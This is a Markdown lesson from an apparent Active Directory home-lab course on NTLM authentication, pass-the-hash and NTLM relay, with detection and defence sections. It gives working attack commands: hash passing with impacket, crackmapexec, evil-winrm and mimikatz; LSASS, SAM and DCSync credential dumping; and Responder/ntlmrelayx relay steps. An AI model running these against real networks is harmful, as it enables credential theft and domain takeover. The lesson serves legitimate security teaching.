# 02 — NTLM Authentication and Pass-the-Hash

> NTLM is the foundation of one of the most powerful attacks in
> Active Directory: Pass-the-Hash. Understanding how NTLM works
> explains exactly why you can authenticate with a hash instead of
> a password — and why this is so dangerous.

---

## Table of Contents
1. [What is NTLM?](#1-what-is-ntlm)
2. [NTLM vs Kerberos: When Each Is Used](#2-ntlm-vs-kerberos-when-each-is-used)
3. [NTLM Authentication Flow](#3-ntlm-authentication-flow)
4. [Why the Hash Is Enough to Authenticate](#4-why-the-hash-is-enough-to-authenticate)
5. [NTLMv1 vs NTLMv2](#5-ntlmv1-vs-ntlmv2)
6. [NTLM Hashes: Where They Live](#6-ntlm-hashes-where-they-live)
7. [Pass-the-Hash Attack](#7-pass-the-hash-attack)
8. [NTLM Relay Attack](#8-ntlm-relay-attack)
9. [Capturing NTLM Hashes](#9-capturing-ntlm-hashes)
10. [What Our Lab Will Demonstrate](#10-what-our-lab-will-demonstrate)
11. [Defense](#11-defense)

---

## 1. What is NTLM?

**NTLM (NT LAN Manager)** is Microsoft's authentication protocol,
designed in the early 1990s. It predates Active Directory and Kerberos.

Despite being decades old and having known critical weaknesses, NTLM
is still active in virtually every Windows environment today because:
- Legacy applications require it
- Non-domain machines use it (workgroup authentication)
- Cross-domain scenarios where Kerberos isn't available
- Fallback when Kerberos fails

```
Authentication methods in a Windows environment:
┌─────────────────────────────────────────────────────┐
│  Kerberos ← DEFAULT in AD (tickets, time-based)    │
│  NTLM     ← FALLBACK (challenge-response, stateless)│
│  LDAP     ← Directory queries                       │
└─────────────────────────────────────────────────────┘
```

---

## 2. NTLM vs Kerberos: When Each Is Used

| Scenario | Protocol Used |
|----------|--------------|
| Domain user logs in to domain-joined PC | Kerberos |
| Access file share by hostname (`\\server\share`) | Kerberos |
| Access file share by IP address (`\\10.10.10.x\share`) | **NTLM** |
| Local account authentication | **NTLM** |
| Non-domain-joined machine to domain resource | **NTLM** |
| Service cannot locate the DC | **NTLM (fallback)** |
| Older protocol (SMB1, HTTP Basic) | **NTLM** |
| WMI, PowerShell Remoting | Kerberos (preferred), NTLM (fallback) |

**Key insight for attackers:** Forcing authentication via IP address
instead of hostname forces NTLM. This is used in relay attacks.

---

## 3. NTLM Authentication Flow

NTLM uses a **challenge-response** mechanism. The password is never
sent over the network — only proof that you know it.

```
Client (Alice)                    Server / DC
      │                                │
      │─── 1. NEGOTIATE ──────────────▶│
      │    "I want to authenticate"    │
      │    + NTLM capabilities         │
      │                                │
      │◀── 2. CHALLENGE ───────────────│
      │    Server sends: NONCE         │
      │    (random 8-byte value)       │
      │                                │
      │─── 3. AUTHENTICATE ───────────▶│
      │    Client sends:               │
      │    + Username                  │
      │    + Domain                    │
      │    + NTLM_Response             │
      │      = f(NTLM_hash, NONCE)     │
      │                                │
      │                    DC verifies:│
      │                    hash NONCE  │
      │                    = response? │
      │                                │
      │◀── 4. RESULT ──────────────────│
      │    Success / Failure           │
```

### Step 3 in detail — how the response is calculated

```
NTLMv2 response = HMAC-MD5(NTLM_hash, username + domain + nonce + timestamp)

Where:
  NTLM_hash = MD4(UTF-16LE(password))   ← the stored hash
  nonce     = server's random challenge
  timestamp = current time (prevents replay)
```

**The password is never sent.** Only the response (which depends on
the hash) travels over the network.

---

## 4. Why the Hash Is Enough to Authenticate

This is the core of Pass-the-Hash. Look at the response formula again:

```
NTLMv1 response = DES(NTLM_hash, server_nonce)

NTLMv2 response = HMAC-MD5(NTLM_hash, username + domain + nonce + timestamp)
```

The **NTLM hash IS the secret**. The password is only ever used to
produce the hash. The hash is then used to produce the response.

```
Normal flow:
  Password → [MD4] → NTLM_hash → [HMAC-MD5 + nonce] → Response → Auth

Pass-the-Hash:
  (skip)   →         NTLM_hash → [HMAC-MD5 + nonce] → Response → Auth
                      ↑
                      Attacker has this directly (from SAM, NTDS.dit, memory)
```

The server never asks for the password — it only verifies the response.
If you have the hash, you can calculate the correct response.
**Having the hash is functionally equivalent to having the password.**

---

## 5. NTLMv1 vs NTLMv2

### NTLMv1 (1993) — CRITICAL WEAKNESS
```
Response = DES(NTLM_hash, server_nonce)

Problems:
- Uses DES (56-bit key) — breakable in hours
- No client nonce — vulnerable to relay attacks
- No timestamp — vulnerable to replay attacks
```
NTLMv1 should be disabled everywhere. In a compromised environment,
downgrade attacks can force NTLMv1.

### NTLMv2 (1996) — STRONGER BUT STILL ATTACKABLE
```
Response = HMAC-MD5(NTLM_hash, username + domain + server_nonce + client_nonce + timestamp)

Improvements:
- Adds client-generated nonce (prevents some relay attacks)
- Adds timestamp (replay window: 5 minutes by default)
- Longer response (harder to brute-force the challenge-response)

Still vulnerable to:
- Pass-the-Hash (attacker still only needs NTLM hash)
- Relay attacks (with specific conditions)
- Offline cracking of captured responses
```

### Identifying in network captures
```
NTLMv1 response hash: net-ntlm hash type 1
  Hashcat mode: 5500

NTLMv2 response hash: net-ntlmv2
  Hashcat mode: 5600
  Example from Responder capture:
  alice::HOMELAB:aabbccdd...:112233...:010100000000...
```

**Important distinction:**
- **NTLM hash** (mode 1000): the stored hash from SAM/NTDS.dit → usable for Pass-the-Hash
- **NTLMv2 response** (mode 5600): the challenge-response captured on the wire → must be cracked, not replayable

---

## 6. NTLM Hashes: Where They Live

### On a Windows workstation (local accounts)
```
Location: C:\Windows\System32\config\SAM
Protected by: SYSKEY (from SYSTEM hive)
Readable with:
  - Admin rights + mimikatz: sekurlsa::logonpasswords
  - Admin rights + impacket: secretsdump.py
  - Physical access: extract both SAM and SYSTEM, decrypt offline

Format:
  Administrator:500:LM_hash:NT_hash:::
  LocalAdmin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### In LSASS memory (logged-in sessions)
```
Location: LSASS.exe process memory (Live system)
Contains: NTLM hashes of currently logged-in users
Readable with (requires admin/SYSTEM):
  - mimikatz: sekurlsa::logonpasswords
  - Task Manager → dump LSASS process (then parse offline)
  - procdump: procdump.exe -ma lsass.exe lsass.dmp

Why it's there: Windows keeps credentials in memory for SSO
                (Single Sign-On) — convenient for users, gold for attackers
```

### In Active Directory (all domain users)
```
Location: C:\Windows\NTDS\NTDS.dit (on Domain Controllers)
Contains: NTLM hashes for EVERY domain account
Readable with (requires Domain Admin):
  - DCSync: mimikatz lsadump::dcsync or impacket secretsdump.py
  - VSS shadow copy + secretsdump.py LOCAL
  - Physical access to DC

This is the ultimate prize: one file contains all credentials
for the entire organization.
```

---

## 7. Pass-the-Hash Attack

### Concept
```
Normal login:   Alice types "Password123!" → Windows authenticates
Pass-the-Hash:  Attacker uses "64f12cdd..." → Windows authenticates

From Windows' perspective: indistinguishable.
```

### Tools for Pass-the-Hash

#### impacket — psexec.py (get a shell)
```bash
# With password (normal):
python3 psexec.py homelab.local/alice.rossi:Password123!@10.10.10.10

# With hash (Pass-the-Hash):
python3 psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b \
  homelab.local/alice.rossi@10.10.10.10

# Format: -hashes LM_hash:NT_hash
# LM hash can always be: aad3b435b51404eeaad3b435b51404ee (empty LM)
```

#### impacket — smbexec.py, wmiexec.py
```bash
# Similar syntax, different execution mechanism
python3 wmiexec.py -hashes :NTLM_HASH homelab.local/administrator@10.10.10.10
python3 smbexec.py -hashes :NTLM_HASH homelab.local/administrator@10.10.10.10
```

#### CrackMapExec (CME)
```bash
# Test which machines the hash works on (lateral movement)
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH
# (pwn3d!) = local admin on that machine

# Execute command
crackmapexec smb 10.10.10.10 -u administrator -H NTLM_HASH -x "whoami"

# Dump SAM on remote host
crackmapexec smb 10.10.10.10 -u administrator -H NTLM_HASH --sam
```

#### Evil-WinRM (Windows Remote Management shell)
```bash
evil-winrm -i 10.10.10.10 -u administrator -H NTLM_HASH
# Full PowerShell session
```

#### Mimikatz (on Windows target)
```bash
# Pass-the-Hash to spawn process with different credentials
sekurlsa::pth /user:administrator /domain:homelab.local \
  /ntlm:NTLM_HASH /run:cmd.exe
# A new cmd.exe opens running as administrator
```

### Pass-the-Hash Attack Chain in Our Lab

```
Step 1: Gain foothold (already done in Phase 2)
  Kali exploits vsftpd → root shell on Metasploitable

Step 2: Kerberoast service account (Phase 4)
  GetUserSPNs.py → get svc-sql TGS → hashcat → "SqlService2024!"

Step 3: Use cracked password to authenticate to DC01
  crackmapexec smb 10.10.10.10 -u svc-sql -p SqlService2024!

Step 4: Escalate to Domain Admin (depends on lab config)
  BloodHound shows path → compromise labadmin

Step 5: DCSync to dump all hashes
  secretsdump.py homelab.local/labadmin:L4bAdm1n!@10.10.10.10
  → Get Administrator NTLM hash: 31d6cfe0...

Step 6: Pass-the-Hash as Administrator (no password needed)
  psexec.py -hashes :31d6cfe0... homelab.local/administrator@10.10.10.10
  → Full domain admin shell
```

---

## 8. NTLM Relay Attack

### The Concept
Instead of cracking the captured NTLM challenge-response, relay it
in real time to another server to authenticate as that user.

```
Victim (Alice)                  Attacker              Target Server
     │                              │                        │
     │  "I want to access          │                        │
     │   \\attacker\share"         │                        │
     │──────────────────────────▶  │                        │
     │                             │── connect to target ──▶│
     │                             │◀── CHALLENGE ──────────│
     │◀──── CHALLENGE ─────────────│                        │
     │                             │                        │
     │──── RESPONSE(hash+challenge)│                        │
     │──────────────────────────▶  │                        │
     │                             │──── RESPONSE ─────────▶│
     │                             │                        │
     │                             │◀─── AUTH SUCCESS ──────│
     │                             │                        │
     │                             │  (now authenticated as Alice)
```

### Tools: Responder + ntlmrelayx
```bash
# Step 1: Poison network (LLMNR/NBT-NS poisoning) with Responder
sudo responder -I eth0 -rdw

# Step 2: Relay captured auth to target with ntlmrelayx
python3 ntlmrelayx.py -t 10.10.10.10 -smb2support

# When Alice tries to access a non-existent share:
# Responder captures the NTLM auth → ntlmrelayx relays it to DC01
# If Alice has admin rights on DC01 → dump SAM automatically
```

### Requirements for relay to work
- SMB signing must be **disabled** on the target
- Cannot relay back to the same machine (loop protection)
- NTLMv2 relay requires the same nonce → timing dependent

```bash
# Check if SMB signing is enabled (defense check):
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# Lists hosts with signing disabled → relay targets
```

---

## 9. Capturing NTLM Hashes

### Method 1: Responder (passive capture)
```bash
# Poison LLMNR/NBNS/mDNS — captures hashes when users try to
# access non-existent shares or hostnames that don't resolve via DNS
sudo responder -I eth0

# Output when successful:
[SMB] NTLMv2-SSP Client: 10.10.10.50
[SMB] NTLMv2-SSP Username: HOMELAB\alice.rossi
[SMB] NTLMv2-SSP Hash: alice.rossi::HOMELAB:aabb...:1122...:010100...

# Save captured hashes: /usr/share/responder/logs/
```

### Method 2: Secretsdump (requires credentials or hash)
```bash
# Dump SAM (local accounts) + LSA secrets
python3 secretsdump.py homelab.local/administrator:password@10.10.10.50

# DCSync (all domain hashes)
python3 secretsdump.py homelab.local/labadmin:L4bAdm1n!@10.10.10.10
```

### Method 3: Mimikatz from compromised host
```bash
# Must run as SYSTEM or with SeDebugPrivilege
privilege::debug
sekurlsa::logonpasswords    # Dump all sessions from LSASS
lsadump::sam                # Dump SAM database
lsadump::dcsync /domain:homelab.local /all   # DCSync
```

---

## 10. What Our Lab Will Demonstrate

### Phase 4 NTLM-related attacks (planned)

```
Attack 1: Kerberoasting → crack service account → PtH with hash
  Tools: GetUserSPNs.py, hashcat, crackmapexec

Attack 2: Secretsdump after Domain Admin access
  Tools: secretsdump.py
  Result: ALL domain user hashes including Administrator and krbtgt

Attack 3: Pass-the-Hash with Administrator hash
  Tools: psexec.py or evil-winrm
  Result: shell on any domain-joined machine as Administrator
```

### Wazuh detection of NTLM attacks (Blue Team)

Wazuh can detect:
```
Event ID 4776: NTLM authentication attempt (DC)
Event ID 4624: Successful logon with NTLM
Event ID 4625: Failed logon attempt (password spray indicator)

Indicators of lateral movement:
- Multiple 4624 events from same source IP with NTLM in short time
- Authentication to multiple hosts in sequence
- Logon type 3 (network) from non-standard source
```

---

## 11. Defense

### Against Pass-the-Hash

| Defense | Implementation | Effectiveness |
|---------|---------------|---------------|
| **Credential Guard** | Enable in Windows Security → Device Security | Protects LSASS memory from mimikatz |
| **Protected Users group** | Add admins to Protected Users in AD | Disables NTLM for those accounts |
| **Restrict local admin** | Remove local admin rights from standard users | Prevents hash dumping |
| **Unique local admin passwords (LAPS)** | Deploy Microsoft LAPS | Each machine has different local admin password |
| **SMB Signing** | Enable on all hosts via GPO | Defeats NTLM relay attacks |
| **Tiering model** | Domain Admin only on DCs, not workstations | Limits hash exposure |
| **Disable NTLMv1** | GPO: Network security: LAN Manager authentication level = NTLMv2 only | Removes weakest NTLM version |
| **Monitor Event 4776** | SIEM alert on unusual NTLM auth | Detects spray and relay |

### The fundamental limitation
Pass-the-Hash is possible **by design** in NTLM — the protocol requires
presenting the hash to authenticate. The only complete mitigations are:

1. Eliminate NTLM entirely (difficult — breaks legacy apps)
2. Protect against hash extraction (Credential Guard)
3. Make each hash useless if stolen (LAPS — different hash per machine)
4. Alert on unusual NTLM authentication patterns (SIEM)

---

## Quick Reference

| Concept | Key Point |
|---------|-----------|
| NTLM hash | MD4(UTF-16LE(password)) — stored in SAM and NTDS.dit |
| NTLMv2 response | HMAC-MD5(hash + nonces + timestamp) — captured on wire |
| Pass-the-Hash | Use hash directly to authenticate — no cracking needed |
| Hash locations | SAM (local), LSASS memory (active sessions), NTDS.dit (all domain) |
| PtH tools | psexec.py, crackmapexec, evil-winrm, mimikatz sekurlsa::pth |
| NTLM relay | Intercept + forward NTLM auth to different target in real time |
| Relay prevention | Enable SMB signing on all domain machines |
| PtH prevention | Credential Guard, Protected Users, LAPS, tiering model |

> **The key insight:** NTLM was designed in 1993. It assumes that
> if you can produce the correct response to a challenge, you know
> the password. It doesn't realize that having the hash IS knowing
> the password. This architectural flaw cannot be patched away.
